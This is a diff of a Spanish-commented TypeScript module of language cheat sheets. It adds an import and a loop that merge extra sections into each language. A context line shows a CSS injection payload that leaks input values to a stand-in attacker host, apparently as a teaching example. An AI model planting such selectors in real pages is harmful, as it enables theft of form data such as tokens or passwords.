@@ -1,6 +1,9 @@
 /* Chuletas de lenguajes: secciones temáticas con snippets REALES
    (todos los defaults ejecutan sin error en su motor) y explicación
-   de cada bloque orientada a quien ya sabe programar en otro lenguaje. */
+   de cada bloque orientada a quien ya sabe programar en otro lenguaje.
+   Las secciones viven aquí y en langs-extra.ts (fusionadas abajo). */
+
+import { EXTRA_SECTIONS } from './langs-extra'
 
 export interface LangSection {
   title: string
@@ -984,3 +987,9 @@ input[value^="b"] { background: url(//atacante/b); }
 ]
 
 export const LANG_INDEX = Object.fromEntries(LANGS.map((l) => [l.id, l]))
+
+/* Segunda oleada de secciones (langs-extra.ts) fusionada en cada lenguaje */
+for (const l of LANGS) {
+  const extra = EXTRA_SECTIONS[l.id]
+  if (extra) l.sections = [...l.sections, ...extra]
+}
